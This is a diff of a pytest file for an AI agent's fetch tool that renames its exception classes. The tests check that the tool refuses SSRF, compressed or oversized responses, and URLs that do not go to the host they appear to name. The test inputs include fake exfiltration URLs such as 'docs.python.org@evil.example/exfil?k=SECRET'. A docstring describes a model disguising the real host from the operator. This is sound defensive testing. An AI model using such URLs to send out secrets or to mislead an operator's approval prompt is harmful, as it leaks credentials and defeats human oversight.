@@ -19,8 +19,8 @@ import pytest
 
 from agent6.config import Config
 from agent6.kinds import IsolationLevel
-from agent6.tools.dispatch import ToolDenied, ToolDispatcher, ToolError
-from agent6.tools.fetch import MAX_BYTES, FetchRefused, check_url, fetch, host_allowed
+from agent6.tools.dispatch import ToolDeniedError, ToolDispatcher, ToolError
+from agent6.tools.fetch import MAX_BYTES, FetchRefusedError, check_url, fetch, host_allowed
 from agent6.tools.operator_prompts import ApprovalAnswer, ApprovalRequest, OperatorPrompts
 
 
@@ -72,7 +72,7 @@ def _fetch_serving(
     ],
 )
 def test_only_https_with_a_host_is_fetched(url: str) -> None:
-    with pytest.raises(FetchRefused):
+    with pytest.raises(FetchRefusedError):
         check_url(url)
 
 
@@ -90,7 +90,7 @@ def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None
     """SSRF is the whole threat: the agent process sits inside the operator's
     network and holds their credentials. A literal needs no lookup, so it is
     refused before anyone is even asked about it."""
-    with pytest.raises(FetchRefused, match="not a public address"):
+    with pytest.raises(FetchRefusedError, match="not a public address"):
         check_url(f"https://{host}/x")
 
 
@@ -104,7 +104,7 @@ def test_a_name_resolving_off_the_public_internet_is_refused(
         return [(0, 0, 0, "", ("127.0.0.1", 443))]
 
     monkeypatch.setattr(socket, "getaddrinfo", _local)
-    with pytest.raises(FetchRefused, match="not a public address"):
+    with pytest.raises(FetchRefusedError, match="not a public address"):
         fetch(check_url("https://localhost/x"))
 
 
@@ -139,7 +139,7 @@ def test_a_host_the_operator_never_named_is_asked_about(tmp_path: Path) -> None:
         return ApprovalAnswer(False, "stdin")
 
     d = ToolDispatcher(root=tmp_path, config=Config(), prompts=OperatorPrompts(approver=_deny))
-    with pytest.raises(ToolDenied, match="fetch not approved"):
+    with pytest.raises(ToolDeniedError, match="fetch not approved"):
         d.dispatch("fetch", {"url": "https://example.com/x?k=v"})
     assert asked == ["Allow fetch: example.com /x?k=v"]
 
@@ -177,7 +177,7 @@ def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
     """httpx builds an Authorization header from userinfo, so `@` is the model
     choosing a credential AND hiding the real host: the operator's eye lands on
     `docs.python.org` while the query string goes to `evil.example`."""
-    with pytest.raises(FetchRefused, match="credentials"):
+    with pytest.raises(FetchRefusedError, match="credentials"):
         check_url("https://docs.python.org@evil.example/exfil?k=SECRET")
 
 
@@ -304,7 +304,7 @@ def test_a_compressed_response_is_refused_not_decoded(monkeypatch: pytest.Monkey
         headers={"content-type": "text/plain", "content-encoding": "gzip"},
         content=gzip.compress(b"a" * 4096),
     )
-    with pytest.raises(FetchRefused, match="content-encoding"):
+    with pytest.raises(FetchRefusedError, match="content-encoding"):
         fetch(check_url("https://example.com/x"))
 
 
@@ -312,7 +312,7 @@ def test_an_oversized_body_is_refused_while_it_arrives(monkeypatch: pytest.Monke
     _fetch_serving(
         monkeypatch, headers={"content-type": "text/plain"}, content=b"x" * (MAX_BYTES + 1)
     )
-    with pytest.raises(FetchRefused, match="larger than"):
+    with pytest.raises(FetchRefusedError, match="larger than"):
         fetch(check_url("https://example.com/x"))
 
 
@@ -334,7 +334,7 @@ def test_a_denied_fetch_never_touches_the_resolver(
         return ApprovalAnswer(False, "stdin")
 
     d = ToolDispatcher(root=tmp_path, config=Config(), prompts=OperatorPrompts(approver=_deny))
-    with pytest.raises(ToolDenied, match="fetch not approved"):
+    with pytest.raises(ToolDeniedError, match="fetch not approved"):
         d.dispatch("fetch", {"url": "https://payload.exfil.attacker.example/x"})
     assert resolved == []
 
@@ -354,10 +354,10 @@ def test_a_port_out_of_range_is_a_fetch_refusal_and_a_note_needs_a_30x() -> None
     """`check_url` never touched the port, so a URL with port 99999 passed
     the gate and `fetch` raised a bare ValueError after the approval was
     answered; and the redirect note rode on any Location, a 201's included."""
-    from agent6.tools.fetch import FetchRefused, check_url
+    from agent6.tools.fetch import FetchRefusedError, check_url
     from agent6.tools.results import FetchResult
 
-    with pytest.raises(FetchRefused, match="cannot be read"):
+    with pytest.raises(FetchRefusedError, match="cannot be read"):
         check_url("https://example.com:99999/x")
     created = FetchResult(
         url="https://x", status=201, content_type="text/plain", body="", location="/new"
